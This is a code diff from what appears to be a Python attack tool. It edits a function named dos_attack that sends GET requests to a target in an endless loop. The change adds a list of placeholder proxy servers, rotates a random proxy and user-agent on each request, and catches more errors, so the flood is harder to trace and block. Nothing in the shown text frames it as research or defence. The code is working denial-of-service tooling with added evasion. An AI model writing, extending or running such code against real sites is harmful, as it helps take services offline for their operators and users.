@@ -14,7 +14,13 @@ import re
 
 # Initialize colorama for colored output
 init(autoreset=True)
-
+# List of proxies to use
+proxies = [
+    "http://proxy1.example.com:8080",
+    "http://proxy2.example.com:8080",
+    "http://proxy3.example.com:8080",
+    # Add more proxies as needed
+]
 # List of user-agents to randomize requests
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -141,10 +147,15 @@ def dos_attack(target):
     print(f"Starting DDOS attack on {target}...")
     while True:
         try:
-            res = requests.get(target)
+            headers = {'User-Agent': random.choice(user_agents)}
+            proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)}
+            res = requests.get(target, headers=headers, proxies=proxy)
             print("Request sent!")
         except requests.exceptions.ConnectionError:
             print("[ERROR] Connection error!")
+        except Exception as e:
+            print(f"[ERROR] An error occurred: {e}")
+
 
 # Main Menu
 def display_ui():
